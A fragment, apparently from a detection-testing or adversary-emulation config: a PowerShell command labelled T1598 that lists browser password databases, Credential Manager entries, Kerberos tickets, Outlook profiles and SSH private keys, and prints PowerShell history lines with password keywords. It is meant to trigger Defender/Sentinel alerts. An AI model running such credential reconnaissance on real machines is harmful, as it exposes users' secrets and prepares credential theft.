      "command": "Write-Host '[START] T1598 - Phishing for Information Recon (credential surface enumeration)'; Write-Host '[INFO] Step 1/6: Browser credential database paths (Chrome/Edge/Firefox Login Data)'; $browserCredPaths = @( @{Label='Chrome Login Data (SQLite)'; Path=Join-Path $env:LOCALAPPDATA 'Google\\Chrome\\User Data\\Default\\Login Data'}, @{Label='Chrome Login Data Backup'; Path=Join-Path $env:LOCALAPPDATA 'Google\\Chrome\\User Data\\Default\\Login Data For Account'}, @{Label='Edge Login Data (SQLite)'; Path=Join-Path $env:LOCALAPPDATA 'Microsoft\\Edge\\User Data\\Default\\Login Data'}, @{Label='Firefox logins.json'; Path=Join-Path $env:APPDATA 'Mozilla\\Firefox\\Profiles'}, @{Label='Opera Login Data'; Path=Join-Path $env:APPDATA 'Opera Software\\Opera Stable\\Login Data'}, @{Label='Brave Login Data'; Path=Join-Path $env:LOCALAPPDATA 'BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data'} ); foreach ($bc in $browserCredPaths) { $exists = Test-Path $bc.Path; $size = if ($exists -and (Get-Item $bc.Path -ErrorAction SilentlyContinue).PSIsContainer -eq $false) { (Get-Item $bc.Path).Length } else { 0 }; Write-Host ('[INFO]   [' + $(if ($exists) { 'FOUND' } else { 'absent' }) + '] ' + $bc.Label + ': ' + $bc.Path + $(if ($size -gt 0) { ' (' + $size + ' bytes)' } else { '' })) }; Write-Host '[INFO] Step 2/6: Windows Credential Manager (cmdkey /list)'; try { $ckOutput = & cmdkey.exe /list 2>&1; $ckEntries = $ckOutput | Where-Object { $_ -match 'Target|Type|User' }; Write-Host ('[INFO] cmdkey entries: ' + @($ckEntries).Count); $ckEntries | Select-Object -First 15 | ForEach-Object { Write-Host ('    ' + $_.Trim()) } } catch { Write-Host ('[INFO] cmdkey: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 3/6: Kerberos ticket cache (klist - cached domain credentials)'; try { $klistOutput = & klist.exe 2>&1; $tickets = $klistOutput | Where-Object { $_ -match 'Server:|Client:|Ticket flags' }; Write-Host ('[INFO] Kerberos tickets cached: ' + ([math]::Ceiling(@($tickets).Count / 3))); $tickets | Select-Object -First 9 | ForEach-Object { Write-Host ('    ' + $_.Trim()) } } catch { Write-Host ('[INFO] klist: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 4/6: Outlook/Exchange credential registry'; $outlookRegPaths = @( 'HKCU:\\Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles', 'HKCU:\\Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles' ); foreach ($orp in $outlookRegPaths) { if (Test-Path $orp) { $profiles = Get-ChildItem -Path $orp -ErrorAction SilentlyContinue; Write-Host ('[INFO] Outlook profiles at ' + $orp + ': ' + @($profiles).Count) } }; Write-Host '[INFO] Step 5/6: SSH keys and known_hosts'; $sshPaths = @( @{Path=Join-Path $env:USERPROFILE '.ssh\\known_hosts';Label='SSH known_hosts (target host recon)'}, @{Path=Join-Path $env:USERPROFILE '.ssh\\id_rsa';Label='SSH RSA private key'}, @{Path=Join-Path $env:USERPROFILE '.ssh\\id_ed25519';Label='SSH Ed25519 private key'}, @{Path=Join-Path $env:USERPROFILE '.ssh\\config';Label='SSH config (stored hosts/users)'} ); foreach ($sp in $sshPaths) { $e = Test-Path $sp.Path; Write-Host ('[INFO]   [' + $(if ($e) { 'FOUND' } else { 'absent' }) + '] ' + $sp.Label + ': ' + $sp.Path) }; Write-Host '[INFO] Step 6/6: PowerShell history (commands may contain passwords)'; $psHistoryPath = Join-Path $env:APPDATA 'Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'; if (Test-Path $psHistoryPath) { $histLines = Get-Content $psHistoryPath -ErrorAction SilentlyContinue | Where-Object { $_ -match 'password|pass|pwd|secret|key|token|credential|cred' -and $_ -notmatch '^#' }; Write-Host ('[WARN] PS history has ' + @($histLines).Count + ' lines containing credential keywords at: ' + $psHistoryPath); $histLines | Select-Object -First 5 | ForEach-Object { Write-Host ('    ' + $_.Substring(0,[math]::Min(80,$_.Length)) + '...') } } else { Write-Host '[INFO] PS history: not found' }; Write-Host '[SUCCESS] T1598 - Credential surface recon completed. Sentinel target: Browser Login Data + cmdkey + klist + SSH key + PS history access from non-browser process (MDE - credential harvest pre-recon behavioral detection)'",
